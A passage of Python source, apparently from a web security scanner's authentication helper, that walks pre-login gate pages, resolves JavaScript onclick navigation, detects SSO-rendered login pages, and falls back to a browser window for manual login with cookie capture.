        for form_m in _re3.finditer(r"(?s)<form[^>]*>(.+?)</form>", html, _re3.IGNORECASE):
            form_tag  = form_m.group(0)
            form_body = form_m.group(1)

            act_raw = ""
            act_m   = _re3.search(r'\baction=["\']([^"\']*)["\']', form_tag, _re3.IGNORECASE)
            if act_m:
                act_raw = act_m.group(1).strip()
            action = _uj3(page_url, act_raw) if act_raw else page_url

            has_pw  = bool(_re3.search(r'<input[^>]+type=["\']?password["\']?',       form_body, _re3.IGNORECASE))
            has_txt = bool(_re3.search(r'<input[^>]+type=["\']?(text|email|tel)["\']?', form_body, _re3.IGNORECASE))
            has_cb  = bool(_re3.search(r'<input[^>]+type=["\']?checkbox["\']?',        form_body, _re3.IGNORECASE))

            if has_pw:
                result["has_password"] = True
                if result["login_form"] is None:
                    result["login_form"] = {"action": action, "hidden": _collect_hidden(form_body)}
            if has_txt:
                result["has_username"] = True
            if has_cb:
                result["has_checkbox"] = True
                if not has_pw:
                    # Collect all named fields (checkboxes, hidden, selects) for the gate POST
                    fields: dict = {}
                    for inp in _re3.finditer(r"<input[^>]+>", form_body, _re3.IGNORECASE):
                        tag  = inp.group(0)
                        t_m  = _re3.search(r'\btype=["\']?(\w+)["\']?',    tag, _re3.IGNORECASE)
                        n_m  = _re3.search(r'\bname=["\']([^"\']+)["\']',  tag, _re3.IGNORECASE)
                        v_m  = _re3.search(r'\bvalue=["\']([^"\']*)["\']', tag, _re3.IGNORECASE)
                        if not n_m:
                            continue
                        itype = t_m.group(1).lower() if t_m else "text"
                        val   = v_m.group(1) if v_m else ""
                        if itype == "checkbox":
                            fields[n_m.group(1)] = val or "on"   # checked
                        elif itype not in ("submit", "image", "reset", "button"):
                            fields[n_m.group(1)] = val
                    # Also pick up any <select> defaults
                    for sel_m in _re3.finditer(
                            r'<select[^>]+name=["\']([^"\']+)["\'][^>]*>(.*?)</select>',
                            form_body, _re3.IGNORECASE | _re3.DOTALL):
                        sel_name = sel_m.group(1)
                        opt_m = _re3.search(
                            r'<option[^>]+value=["\']([^"\']*)["\'][^>]*>', sel_m.group(2), _re3.IGNORECASE)
                        if opt_m and sel_name not in fields:
                            fields[sel_name] = opt_m.group(1)
                    result["checkbox_forms"].append({"action": action, "fields": fields})

            # ── Affirmative submit buttons in non-password forms ──────────────
            # (password forms are the target — we don't treat them as nav buttons)
            if not has_pw:
                _form_method_m = _re3.search(
                    r'\bmethod=["\']?(\w+)["\']?', form_tag, _re3.IGNORECASE)
                _form_method = (_form_method_m.group(1).lower()
                                if _form_method_m else "post")

                # If the form has no real interactive inputs (text/email/checkbox/
                # select/textarea) — i.e. it is purely a navigation step — type
                # depends on the form method.  POST navigation forms (common in
                # Java .action / .do apps) use "form_submit" so they are correctly
                # POSTed; GET navigation forms use "link" for a plain GET.
                _form_has_inputs = bool(_re3.search(
                    r'<input[^>]+type=["\']?(?:text|email|tel|number|search|'
                    r'checkbox|radio|password)["\']?',
                    form_body, _re3.IGNORECASE,
                )) or bool(_re3.search(
                    r'<(?:textarea|select)\b', form_body, _re3.IGNORECASE,
                ))
                _affirm_type = (
                    "form_submit"
                    if (_form_has_inputs or _form_method == "post")
                    else "link"
                )

                # Also treat the form as affirmative if the action URL itself
                # contains login-hint keywords or known framework path patterns.
                # This catches forms like <form action="Login.action"> even when
                # the button text is blank or an icon.
                _ACTION_HINT_RE = _re3.compile(
                    r'(?:login|signin|sign.in|logon|signon|auth(?:enticate)?'
                    r'|j_security_check|j_spring_security_check'
                    r'|credential)',
                    _re3.IGNORECASE,
                )
                _action_is_login_hint = bool(_ACTION_HINT_RE.search(action))

                _found_affirm_btn = False
                # <input type="submit" value="Login"> style
                for sub_m in _re3.finditer(
                        r'<input[^>]+type=["\']?submit["\']?[^>]*>', form_body, _re3.IGNORECASE):
                    _stag  = sub_m.group(0)
                    _sv_m  = _re3.search(r'\bvalue=["\']([^"\']+)["\']', _stag, _re3.IGNORECASE)
                    _sval  = _sv_m.group(1) if _sv_m else ""
                    if _elem_is_affirmative(_stag, _sval) or _action_is_login_hint:
                        result["affirmative_links"].append({
                            "url":    action,
                            "text":   _sval or "(submit)",
                            "type":   _affirm_type,
                            "method": _form_method,
                            "fields": _collect_hidden(form_body),
                        })
                        _found_affirm_btn = True
                        break
                if not _found_affirm_btn:
                    # <button type="submit">Accept</button> style
                    for btn_m in _re3.finditer(
                            r'<button\b([^>]*)>(.*?)</button>', form_body,
                            _re3.IGNORECASE | _re3.DOTALL):
                        btn_attrs = btn_m.group(1)
                        btn_text  = _strip_tags(btn_m.group(2))
                        t_m       = _re3.search(r'\btype=["\']?(\w+)["\']?', btn_attrs, _re3.IGNORECASE)
                        btn_type  = t_m.group(1).lower() if t_m else "submit"
                        if (btn_type in ("submit", "button")
                                and (_elem_is_affirmative(btn_attrs, btn_text)
                                     or _action_is_login_hint)):
                            result["affirmative_links"].append({
                                "url":    action,
                                "text":   btn_text or "(button)",
                                "type":   _affirm_type,
                                "method": _form_method,
                                "fields": _collect_hidden(form_body),
                            })
                            break

        # ── Inline script content — used for onclick function body lookup ────────
        _script_blocks: list = _re3.findall(
            r'<script\b[^>]*>([\s\S]*?)</script>', html, _re3.IGNORECASE)
        _all_scripts = "\n".join(_script_blocks)

        def _resolve_onclick_url(onclick_val: str) -> str:
            """
            Given an onclick attribute value, try to resolve a navigable URL.

            Strategies (in order):
              1. Direct URL literal in the onclick string (e.g. onclick="location.href='/login'")
              2. Function call (e.g. onclick="rulesOfBehavior(true)") — look the
                 function up in inline <script> blocks and extract the first URL-
                 like string literal from its body.
            Returns a URL string or "" if none found.
            """
            # 1. Inline href assignment
            _direct = _re3.search(
                r'''(?:location\.href|window\.location(?:\.href)?)\s*=\s*['"]([\w/\-.%?=&#]+)['"]''',
                onclick_val, _re3.IGNORECASE)
            if _direct:
                return _direct.group(1)
            # 2. String literal that looks like a URL path
            for _lit in _re3.findall(r'''['"]((?:/[\w\-.%]+)+(?:\?[^'"]*)?)['"']''',
                                      onclick_val):
                if "/" in _lit:
                    return _lit
            # 3. Function name → look up body in inline scripts
            _fn_m = _re3.match(r'\s*(\w+)\s*\(', onclick_val)
            if _fn_m and _all_scripts:
                _fn_name = _re3.escape(_fn_m.group(1))
                _fn_body_m = _re3.search(
                    r'function\s+' + _fn_name +
                    r'\s*\([^)]*\)\s*\{([\s\S]*?)\}',
                    _all_scripts, _re3.IGNORECASE)
                if _fn_body_m:
                    _body = _fn_body_m.group(1)
                    # href assignment inside body
                    _href_m = _re3.search(
                        r'''(?:location\.href|window\.location(?:\.href)?)\s*=\s*['"]([\w/\-.%?=&#]+)['"]''',
                        _body, _re3.IGNORECASE)
                    if _href_m:
                        return _href_m.group(1)
                    # Any URL-like string literal in body
                    for _lit in _re3.findall(r'''['"]([^'"]*(?:\.action|\.do|\.jsf|/login|/auth)[^'"]*)['"]''',
                                              _body, _re3.IGNORECASE):
                        return _lit
                    # Any string containing a path separator
                    for _lit in _re3.findall(r'''['"]([^'"]{3,})['"']''', _body):
                        if "/" in _lit and not _lit.startswith(("//", "http")):
                            return _lit
            return ""

        # ── Affirmative navigation links (<a href="…">) ───────────────────────
        for link_m in _re3.finditer(
                r'<a\b([^>]+)>([\s\S]*?)</a>', html, _re3.IGNORECASE | _re3.DOTALL):
            attrs        = link_m.group(1)
            inner_html   = link_m.group(2)
            link_text    = _strip_tags(inner_html)

            # Check visible text AND content signals (img alt, etc.) AND attrs
            if not _elem_is_affirmative(attrs, link_text, inner_html):
                continue

            href_m   = _re3.search(r'\bhref=["\']([^"\']*)["\']', attrs, _re3.IGNORECASE)
            href_raw = href_m.group(1).strip() if href_m else ""

            # Skip hard non-navigable hrefs (but NOT plain "#" — those may have onclick)
            if href_raw.lower().startswith(("javascript:void", "mailto:", "tel:")):
                continue

            onclick_m   = _re3.search(r'\bonclick=["\']([^"\']+)["\']', attrs, _re3.IGNORECASE)
            onclick_val = onclick_m.group(1) if onclick_m else ""

            # ── href="#" or empty + onclick → JS-driven navigation ───────────
            _is_fragment_href = (not href_raw or href_raw == "#"
                                  or href_raw.lower().startswith("javascript:"))
            if _is_fragment_href and onclick_val:
                _resolved_from_js = _resolve_onclick_url(onclick_val)
                if _resolved_from_js:
                    resolved = _uj3(page_url, _resolved_from_js)
                    vc_label = _strip_tags(inner_html) or onclick_val[:60]
                    result["affirmative_links"].append({
                        "url":     resolved,
                        "text":    vc_label,
                        "type":    "link",
                        "fields":  {},
                    })
                else:
                    # Can't resolve URL from JS — record as js_onclick so
                    # _step_to_login_form can decide to fall back to browser-auth.
                    vc_label = _strip_tags(inner_html) or onclick_val[:60]
                    result["affirmative_links"].append({
                        "url":     page_url,   # stay on page; stepper must handle
                        "text":    vc_label,
                        "type":    "js_onclick",
                        "onclick": onclick_val,
                        "fields":  {},
                    })
                continue

            # ── Normal navigable href ─────────────────────────────────────────
            if _is_fragment_href:
                continue  # no onclick either — nothing to follow
            resolved = _uj3(page_url, href_raw)
            result["affirmative_links"].append({
                "url":    resolved,
                "text":   link_text or attrs[:60],
                "type":   "link",
                "fields": {},
            })

        # ── JS-rendered login page detection ─────────────────────────────────
        # When no static login form was found, inspect whether the page is a
        # known SPA/framework login shell that renders credentials fields via JS.
        # Signals: URL query-param intent + script/body content fingerprints.
        # Sets result["js_rendered_login"] = True when confident; callers must
        # then use browser-auth rather than static form submission.
        result["js_rendered_login"] = False
        if not result["login_form"]:
            _jrl_url_lower = page_url.lower()
            _jrl_html_lower = html.lower()

            # 1. URL-level intent signals — query params or path segments that
            #    indicate the page's purpose is authentication.
            _URL_LOGIN_PARAMS = (
                "legacylogin", "login", "signin", "logon", "signon",
                "returnurl", "returnto", "redirect_uri", "next",
                "auth", "authenticate", "sso", "saml", "oidc",
            )
            _parsed_qs = urllib.parse.parse_qs(
                urllib.parse.urlparse(page_url).query, keep_blank_values=True)
            _qs_keys_lower = {k.lower() for k in _parsed_qs}
            _url_param_hit = any(p in _qs_keys_lower for p in _URL_LOGIN_PARAMS)
            _url_path_hit  = any(
                p in _jrl_url_lower
                for p in ("/login", "/signin", "/logon", "/auth", "/sso",
                          "login=", "logon=", "signin=", "auth=")
            )

            # 2. Content fingerprints split into two tiers:
            #    Strong — authentication-product-specific strings that cannot appear
            #      on ordinary pages.  Scripts + no static form is sufficient proof
            #      even when the static HTML carries no login-intent words (the form
            #      fields are JS-rendered, so they're absent from the raw HTML).
            #    Weak — generic SPA/framework markers that can appear on any Angular,
            #      React, or Vue page.  These require the density heuristic as well.
            _STRONG_SIGNATURES = (
                # IBM Cognos
                "ibmcognos", "bi/?legacylogin", "cam_passport",
                "cognos.config", "ibm.cognos",
                # Okta
                "okta-sign-in", "okta-signin", "okta-widget",
                # Auth0
                "auth0-lock", "auth0.webauth",
                # Keycloak
                "keycloak", "keycloak-js",
                # Microsoft ADAL / MSAL
                "adal.js", "msal.js", "msal-browser",
                # Ping / ForgeRock
                "pingfederate", "pingidentity", "forgerock", "am.login",
                # CA SiteMinder
                "siteminder", "smloginpage",
            )
            # "cognos" alone is a weak signal (common word); keep it here so it
            # still contributes when combined with density or a URL hint.
            _WEAK_SIGNATURES = (
                "cognos",
                "ng-app", "ng-controller", "data-ng-", "v-app", "v-model",
                "react-root", "__react", "_reactroot",
            )
            _strong_content_hit = any(sig in _jrl_html_lower for sig in _STRONG_SIGNATURES)
            _weak_content_hit   = any(sig in _jrl_html_lower for sig in _WEAK_SIGNATURES)
            _content_hit        = _strong_content_hit or _weak_content_hit

            # 3. Script-density heuristic: many <script> tags + page text contains
            #    login intent words but no static form → likely JS-rendered login.
            _script_count  = len(_re3.findall(r'<script\b', html, _re3.IGNORECASE))
            _text_only     = _re3.sub(r'<[^>]+>', ' ', html)
            _text_lower    = _text_only.lower()
            _login_words   = sum(1 for w in (
                "username", "password", "sign in", "log in", "login",
                "credentials", "email", "user id", "user name",
            ) if w in _text_lower)
            _form_count    = len(_re3.findall(r'<form\b', html, _re3.IGNORECASE))
            _density_hit   = (_script_count >= 3 and _login_words >= 2
                              and _form_count == 0)

            # Strong product fingerprint + script-heavy + no static form is
            # sufficient on its own.  The JS login page for IBM Cognos (and most
            # other enterprise SSO products) renders all credential fields via JS;
            # the raw HTML carries zero login-intent words, so _density_hit would
            # always be False for these pages.
            _product_login_hit = (_strong_content_hit
                                  and _script_count >= 3
                                  and _form_count == 0)

            _js_login_detected = (
                _product_login_hit
                or ((_url_param_hit or _url_path_hit) and (_content_hit or _density_hit))
                or (_weak_content_hit and _density_hit)
            )
            if _js_login_detected:
                result["js_rendered_login"] = True
                vc.log(
                    f"[auth] JS-rendered login page detected at {page_url} "
                    f"(url_param={_url_param_hit}, url_path={_url_path_hit}, "
                    f"content={_content_hit}, density={_density_hit})",
                    "INFO",
                )

        return result

    # ── JS onclick automation — try everything before requiring a browser ─────
    def _try_automate_js_onclick(onclick_val: str,
                                  page_html: str,
                                  page_url: str) -> "dict | None":
        """
        Attempt to extract an automatable action from a JS onclick handler.

        Strategies applied in order:
          1. Build a complete script corpus:
               a. All inline <script> blocks on the page
               b. Up to 5 same-host external <script src="…"> files (fetched)
          2. Locate the called function's body using brace-counting (handles
             nested braces unlike a simple regex).
          3. Scan the function body (or full corpus if body not found) for:
               • location.href / window.location assignment    → GET url
               • window.location.assign/replace(url)          → GET url
               • fetch(url, {method, body})                   → POST/GET + data
               • $.post / $.get / $.ajax                      → POST/GET + data
               • XMLHttpRequest .open(method, url)             → POST/GET
               • document.cookie = 'name=value'               → cookie to set
               • form.action = url; … .submit()               → POST form url
          4. Returns {url, method, data, cookies} or None if nothing found.
        """
        import re as _re8, json as _json8
        from urllib.parse import urljoin as _uj8, urlparse as _up8

        _base_host = _up8(page_url).netloc

        # ── 1a. Inline scripts ────────────────────────────────────────────
        _corpus = "\n".join(_re8.findall(
            r'<script\b[^>]*>([\s\S]*?)</script>', page_html, _re8.IGNORECASE))

        # ── 1b. External scripts (same host, up to 5) ─────────────────────
        _ext_srcs = _re8.findall(
            r'<script\b[^>]+\bsrc=["\']([^"\']+)["\']', page_html, _re8.IGNORECASE)
        _fetched = 0
        for _src in _ext_srcs:
            if _fetched >= 5:
                break
            _abs = _uj8(page_url, _src)
            if _up8(_abs).netloc != _base_host:
                continue
            try:
                _sr = sess.get(_abs, timeout=timeout)
                if _sr.status_code == 200:
                    _corpus += "\n" + _sr.text
                    _fetched += 1
            except Exception:
                continue

        # ── 2. Locate function body via brace-counting ────────────────────
        _fn_m = _re8.match(r'\s*(\w+)\s*\(', onclick_val)
        _fn_body = ""
        if _fn_m and _corpus:
            _fn_name = _re8.escape(_fn_m.group(1))
            _fn_hdr  = _re8.search(
                r'function\s+' + _fn_name + r'\s*\([^)]*\)\s*\{',
                _corpus, _re8.IGNORECASE)
            if _fn_hdr:
                _depth = 0
                _end_pos = _fn_hdr.end() - 1
                for _ci, _ch in enumerate(_corpus[_fn_hdr.end() - 1:],
                                          _fn_hdr.end() - 1):
                    if _ch == '{':
                        _depth += 1
                    elif _ch == '}':
                        _depth -= 1
                        if _depth == 0:
                            _end_pos = _ci
                            break
                _fn_body = _corpus[_fn_hdr.end(): _end_pos]

        _scan = _fn_body if _fn_body else _corpus

        # ── 3. Extract automatable signals ────────────────────────────────
        _found_url: str    = ""
        _found_method: str = "get"
        _found_data: dict  = {}
        _found_cookies: dict = {}

        # location.href / window.location assignment
        _lhref = _re8.search(
            r'''(?:location\.href|window\.location(?:\.href)?)\s*=\s*['"]([^'"]+)['"]''',
            _scan, _re8.IGNORECASE)
        if _lhref:
            _found_url, _found_method = _lhref.group(1), "get"

        # window.location.assign / replace
        if not _found_url:
            _loc_fn = _re8.search(
                r'''window\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)''',
                _scan, _re8.IGNORECASE)
            if _loc_fn:
                _found_url, _found_method = _loc_fn.group(1), "get"

        # fetch(url, options)
        if not _found_url:
            _fetch_m = _re8.search(
                r'''fetch\s*\(\s*['"]([^'"]+)['"]\s*(?:,\s*(\{[\s\S]*?\}))?\s*\)''',
                _scan, _re8.IGNORECASE)
            if _fetch_m:
                _found_url  = _fetch_m.group(1)
                _opts       = _fetch_m.group(2) or ""
                _meth_m2    = _re8.search(r'''method\s*:\s*['"](\w+)['"]''', _opts, _re8.IGNORECASE)
                _found_method = _meth_m2.group(1).lower() if _meth_m2 else "get"
                _body_m     = _re8.search(
                    r'''body\s*:\s*JSON\.stringify\s*\((\{[^)]+\})\)''', _opts, _re8.IGNORECASE)
                if _body_m:
                    try:
                        _found_data = _json8.loads(_body_m.group(1))
                    except Exception:
                        pass

        # jQuery $.post / $.get
        if not _found_url:
            _jqp = _re8.search(r'''\$\.post\s*\(\s*['"]([^'"]+)['"]''', _scan, _re8.IGNORECASE)
            if _jqp:
                _found_url, _found_method = _jqp.group(1), "post"
        if not _found_url:
            _jqg = _re8.search(r'''\$\.get\s*\(\s*['"]([^'"]+)['"]''', _scan, _re8.IGNORECASE)
            if _jqg:
                _found_url, _found_method = _jqg.group(1), "get"

        # jQuery $.ajax
        if not _found_url:
            _jqa = _re8.search(r'''\$\.ajax\s*\(\s*\{([\s\S]*?)\}\s*\)''', _scan, _re8.IGNORECASE)
            if _jqa:
                _ab  = _jqa.group(1)
                _au2 = _re8.search(r'''url\s*:\s*['"]([^'"]+)['"]''',           _ab, _re8.IGNORECASE)
                _am2 = _re8.search(r'''(?:type|method)\s*:\s*['"](\w+)['"]''',  _ab, _re8.IGNORECASE)
                if _au2:
                    _found_url    = _au2.group(1)
                    _found_method = _am2.group(1).lower() if _am2 else "post"

        # XMLHttpRequest .open(method, url)
        if not _found_url:
            _xhr = _re8.search(
                r'''\.open\s*\(\s*['"](\w+)['"]\s*,\s*['"]([^'"]+)['"]''',
                _scan, _re8.IGNORECASE)
            if _xhr:
                _found_url, _found_method = _xhr.group(2), _xhr.group(1).lower()

        # form.action = url; form.submit()  (or document.getElementById(...).submit())
        if not _found_url and _re8.search(r'\.submit\s*\(\s*\)', _scan):
            _fa = _re8.search(
                r'''(?:\.action|form\.action)\s*=\s*['"]([^'"]+)['"]''',
                _scan, _re8.IGNORECASE)
            if _fa:
                _found_url, _found_method = _fa.group(1), "post"

        # document.cookie = 'name=value'
        for _cm in _re8.finditer(
                r'''document\.cookie\s*=\s*['"]([A-Za-z_]\w*)=([^;'"]+)''',
                _scan, _re8.IGNORECASE):
            _found_cookies[_cm.group(1).strip()] = _cm.group(2).strip()

        if not _found_url and not _found_cookies:
            return None

        return {
            "url":     _uj8(page_url, _found_url) if _found_url else "",
            "method":  _found_method,
            "data":    _found_data,
            "cookies": _found_cookies,
        }

    # ── Step through gate pages to reach the real login form ─────────────────
    def _step_to_login_form(start_url: str) -> "str":
        """
        Walk through pre-login flow pages until a username+password form is
        found or the step limit is reached.  Returns the resolved login URL.

        Steps taken each iteration:
          1. GET the current URL and analyse forms / navigation.
          2. Login form (has password field) found → return current URL.
          3. Checkbox gate form (checkbox, no password) → POST it and follow.
          4. Affirmative navigation button/link (Login, Accept, Continue, …
             but NOT Cancel, Back, Decline, …) → follow it (POST for form
             submits, GET for links).  Fragment-only hrefs (#) are tried once;
             if they resolve to an already-visited base URL they are skipped.
          5. Nothing actionable found → return current URL with a warning.
        """
        from urllib.parse import urldefrag as _udf3
        _MAX_STEPS = 6
        current_url = start_url
        # Track visited base URLs (fragment stripped) to prevent infinite loops
        _visited_bases: "set[str]" = {_udf3(start_url)[0]}
        vc.log(f"[auth] Inspecting login page: {current_url}", "INFO")

        for _step in range(_MAX_STEPS):
            try:
                resp = sess.get(current_url, timeout=timeout, allow_redirects=True)
            except Exception as _e:
                vc.log(f"[auth] Could not reach {current_url}: {_e}", "WARNING")
                return start_url

            if resp.url != current_url:
                vc.log(f"[auth] Redirected to: {resp.url}", "INFO")
                current_url = resp.url
            _visited_bases.add(_udf3(current_url)[0])

            page = _analyse_form_page(resp.text, current_url)

            # ── Priority 0: JS-rendered login page (no static form) ───────────
            if page.get("js_rendered_login"):
                vc.log(
                    f"[auth] Step {_step + 1}: JS-rendered login page at {current_url} "
                    "— automated form submission not possible; switching to browser-auth",
                    "INFO",
                )
                return "__BROWSER_AUTH__"

            # ── Priority 1: real login form ───────────────────────────────────
            if page["login_form"]:
                vc.log(
                    f"[auth] Step {_step + 1}: Login form detected "
                    f"(username={'yes' if page['has_username'] else 'no'}, password=yes) "
                    f"at {current_url}",
                    "SUCCESS",
                )
                return current_url

            # ── Priority 2: checkbox gate form ────────────────────────────────
            if page["checkbox_forms"]:
                gate = page["checkbox_forms"][0]
                vc.log(
                    f"[auth] Step {_step + 1}: Gate page detected (checkbox, no password) — "
                    f"submitting acceptance form at {current_url}",
                    "INFO",
                )
                try:
                    gate_resp = sess.post(
                        gate["action"], data=gate["fields"],
                        timeout=timeout, allow_redirects=True,
                    )
                    next_url = gate_resp.url
                    vc.log(f"[auth] Gate submitted → {next_url} (HTTP {gate_resp.status_code})", "INFO")
                    current_url = next_url
                except Exception as _e:
                    vc.log(f"[auth] Gate form submission failed: {_e} — using {current_url}", "WARNING")
                    return current_url
                continue

            # ── Priority 3: affirmative navigation button / link ──────────────
            if page["affirmative_links"]:
                # js_onclick links have url == current_url (unresolvable); they
                # must be picked regardless of the visited-base check, and
                # handled via browser-auth fallback.  Regular links are filtered
                # by visited-base to prevent loops.
                nav = None
                _js_nav = None
                for _cand in page["affirmative_links"]:
                    if _cand["type"] == "js_onclick":
                        if _js_nav is None:
                            _js_nav = _cand   # keep first js_onclick as fallback
                        continue
                    _cand_base, _ = _udf3(_cand["url"])
                    if _cand_base not in _visited_bases:
                        nav = _cand
                        break

                # Prefer a resolvable link; fall back to js_onclick
                if nav is None:
                    nav = _js_nav

                if nav is None:
                    vc.log(
                        f"[auth] Step {_step + 1}: Affirmative button(s) found but all "
                        f"target already-visited pages — stopping here",
                        "WARNING",
                    )
                    return current_url

                # ── JS-driven navigation (onclick, href="#") ──────────────────
                if nav["type"] == "js_onclick":
                    import sys as _sys_jo
                    _onclick_val = nav.get("onclick", "")
                    vc.log(
                        f"[auth] Step {_step + 1}: Affirmative JS button detected "
                        f"'{nav['text']}' — onclick: {_onclick_val[:80]}",
                        "INFO",
                    )

                    # ── Try automated resolution first ────────────────────────
                    vc.log(
                        "[auth] Attempting to resolve JS navigation automatically "
                        "(inline scripts, external scripts, XHR/fetch patterns) …",
                        "INFO",
                    )
                    _auto = _try_automate_js_onclick(_onclick_val, resp.text, current_url)

                    if _auto:
                        # Apply any document.cookie assignments
                        if _auto["cookies"]:
                            for _ck_n, _ck_v in _auto["cookies"].items():
                                sess.cookies.set(_ck_n, _ck_v)
                            vc.log(
                                f"[auth] JS cookie(s) applied: "
                                f"{list(_auto['cookies'].keys())}",
                                "INFO",
                            )
                        if _auto["url"]:
                            vc.log(
                                f"[auth] JS navigation resolved → {_auto['url']} "
                                f"({_auto['method'].upper()})",
                                "INFO",
                            )
                            try:
                                if _auto["method"] == "post":
                                    _auto_r = sess.post(
                                        _auto["url"],
                                        data=_auto.get("data", {}),
                                        timeout=timeout,
                                        allow_redirects=True,
                                    )
                                else:
                                    _auto_r = sess.get(
                                        _auto["url"],
                                        params=_auto.get("data", {}),
                                        timeout=timeout,
                                        allow_redirects=True,
                                    )
                                vc.log(
                                    f"[auth] JS request completed → {_auto_r.url} "
                                    f"(HTTP {_auto_r.status_code})",
                                    "INFO",
                                )
                                current_url = _auto_r.url
                                continue
                            except Exception as _ae:
                                vc.log(
                                    f"[auth] JS-resolved request failed: {_ae}",
                                    "WARNING",
                                )
                        elif _auto["cookies"]:
                            # Cookies applied, no navigation target — move on
                            vc.log(
                                "[auth] JS cookies applied, no navigation — continuing",
                                "INFO",
                            )
                            continue

                    # ── Automation exhausted — escalate ───────────────────────
                    vc.log(
                        "[auth] Could not automate JS navigation — browser "
                        "interaction is required for this login flow.",
                        "WARNING",
                    )

                    # --browser-auth already set → switch immediately
                    if cfg.get("browser_auth") and not no_interactive:
                        vc.log(
                            "[auth] --browser-auth set — switching to browser-assisted login",
                            "INFO",
                        )
                        return "__BROWSER_AUTH__"

                    if no_interactive:
                        vc.log(
                            "[auth] JS login requires browser interaction — "
                            "skipping (automated call site)",
                            "INFO",
                        )
                        return ""

                    # Ask the user — works in both TTY and Crucible-managed mode
                    _br_role_suffix = f" for role '{role_label}'" if role_label else ""
                    _br_choice = vc.prompt(
                        f"Open a browser window to complete login manually{_br_role_suffix}?",
                        prompt_type="confirm",
                        options=["Yes", "No"],
                        role=role_label,
                    ).strip()
                    if _br_choice.lower() in ("yes", "y", "1"):
                        return "__BROWSER_AUTH__"
                    vc.log(
                        "[auth] Browser login declined — continuing without authentication",
                        "WARNING",
                    )
                    return ""

                _nav_base, _ = _udf3(nav["url"])
                _visited_bases.add(_nav_base)

                if nav["type"] == "form_submit":
                    _nav_method = nav.get("method", "post")
                    vc.log(
                        f"[auth] Step {_step + 1}: Affirmative button '{nav['text']}' — "
                        f"{_nav_method.upper()} form to {nav['url']}",
                        "INFO",
                    )
                    try:
                        if _nav_method == "get":
                            _nav_resp = sess.get(
                                _nav_base, params=nav.get("fields", {}),
                                timeout=timeout, allow_redirects=True,
                            )
                        else:
                            _nav_resp = sess.post(
                                _nav_base, data=nav.get("fields", {}),
                                timeout=timeout, allow_redirects=True,
                            )
                        next_url = _nav_resp.url
                        vc.log(
                            f"[auth] Affirmative form submitted → {next_url} "
                            f"(HTTP {_nav_resp.status_code})",
                            "INFO",
                        )
                        current_url = next_url
                    except Exception as _e:
                        vc.log(f"[auth] Affirmative form submission failed: {_e}", "WARNING")
                        return current_url
                else:
                    vc.log(
                        f"[auth] Step {_step + 1}: Following affirmative link "
                        f"'{nav['text']}' → {nav['url']}",
                        "INFO",
                    )
                    current_url = nav["url"]
                continue

            # ── Nothing actionable found ──────────────────────────────────────
            vc.log(
                f"[auth] Step {_step + 1}: No login form, gate form, or affirmative "
                f"navigation found at {current_url}",
                "WARNING",
            )
            return current_url

        vc.log(
            f"[auth] Reached step limit ({_MAX_STEPS}) without finding a login form — "
            f"using {current_url}",
            "WARNING",
        )
        return current_url

    # ── Browser-assisted interactive login ────────────────────────────────────
    def _browser_assisted_login(login_url: str) -> "requests.Session | None":
        """
        Open a visible browser window to login_url, let the user authenticate
        manually, then capture all browser cookies and return a pre-loaded
        requests.Session.  Returns None if Selenium is unavailable or no
        supported browser can be launched.

        Browser detection order (first working browser wins):
          Firefox → Iceweasel → LibreWolf → Waterfox → Pale Moon
                  → Chrome → Brave → Chromium → Edge

        Driver resolution for each candidate (in order):
          1. --chromedriver CLI flag / cfg["chromedriver_path"]    (Chrome only)
          2. FRACTURE_CHROMEDRIVER env var                         (Chrome only)
          3. WebDriver binary on $PATH (chromedriver / geckodriver / msedgedriver)
          4. Selenium's built-in driver manager (Selenium 4.6+)
        """
        import shutil as _shutil, os as _os, sys as _sys
        _scope_hostnames = scope_hostnames or set()

        try:
            from selenium import webdriver as _wd
        except ImportError:
            vc.log(
                "[auth] selenium is not installed — cannot use browser-assisted login. "
                "Install with: pip3 install selenium",
                "WARNING",
            )
            return None

        _plat = (
            "darwin"  if _sys.platform == "darwin"
            else "win" if _sys.platform.startswith("win")
            else "linux"
        )

        # ── Browser candidate table ───────────────────────────────────────────
        # engine:      "chrome" | "firefox" | "edge"
        # path_names:  basenames for shutil.which() lookup (all platforms)
        # abs_paths:   absolute install paths per platform (checked if which fails)
        # driver_names: WebDriver binary names for shutil.which()
        _BROWSERS = [
            {
                "name":        "Firefox",
                "engine":      "firefox",
                "path_names":  ["firefox", "firefox-esr", "firefox-bin"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Firefox.app/Contents/MacOS/firefox",
                        "/Applications/Firefox.app/Contents/MacOS/firefox-bin",
                    ],
                    "linux":  [
                        "/usr/bin/firefox", "/usr/bin/firefox-esr",
                        "/usr/local/bin/firefox",
                        "/snap/bin/firefox",
                        "/opt/firefox/firefox",
                    ],
                    "win":    [
                        r"C:\Program Files\Mozilla Firefox\firefox.exe",
                        r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
                    ],
                },
                "driver_names": ["geckodriver"],
            },
            {
                "name":        "Iceweasel",
                "engine":      "firefox",
                "path_names":  ["iceweasel"],
                "abs_paths": {
                    "linux": ["/usr/bin/iceweasel"],
                },
                "driver_names": ["geckodriver"],
            },
            {
                "name":        "LibreWolf",
                "engine":      "firefox",
                "path_names":  ["librewolf"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/LibreWolf.app/Contents/MacOS/librewolf",
                    ],
                    "linux":  [
                        "/usr/bin/librewolf", "/usr/local/bin/librewolf",
                        "/opt/librewolf/librewolf",
                    ],
                    "win":    [
                        r"C:\Program Files\LibreWolf\librewolf.exe",
                    ],
                },
                "driver_names": ["geckodriver"],
            },
            {
                "name":        "Waterfox",
                "engine":      "firefox",
                "path_names":  ["waterfox"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Waterfox.app/Contents/MacOS/waterfox",
                    ],
                    "linux":  ["/usr/bin/waterfox", "/opt/waterfox/waterfox"],
                    "win":    [
                        r"C:\Program Files\Waterfox\waterfox.exe",
                    ],
                },
                "driver_names": ["geckodriver"],
            },
            {
                "name":        "Pale Moon",
                "engine":      "firefox",
                "path_names":  ["palemoon", "pale-moon"],
                "abs_paths": {
                    "darwin": [
                        "/Applications/Pale Moon.app/Contents/MacOS/pale-moon",
                    ],
                    "linux":  ["/usr/bin/palemoon", "/opt/palemoon/palemoon"],
                    "win":    [
                        r"C:\Program Files\Pale Moon\palemoon.exe",
                    ],
                },
                "driver_names": ["geckodriver"],
            },
            {
                "name":        "Chrome",
                "engine":      "chrome",
                "path_names":  ["google-chrome", "google-chrome-stable",
                                 "google-chrome-beta", "chrome"],
                "abs_paths": {
